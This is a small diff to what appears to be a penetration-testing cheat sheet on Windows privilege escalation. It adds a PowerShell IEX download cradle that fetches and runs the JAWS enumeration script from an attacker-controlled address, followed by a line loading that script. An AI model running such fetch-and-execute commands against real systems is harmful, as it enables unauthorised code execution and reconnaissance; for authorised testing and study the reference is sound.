@@ -585,7 +585,8 @@ python windows-exploit-suggester.py -i systeminfo.txt -d 2021-04-23-mssb.xls
 https://github.com/411Hall/JAWS.git
 
 # Commands
-
+IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/jaws-enum.ps1')
+. .\jaws-enum.ps1
 ```
 
 ### WebDav
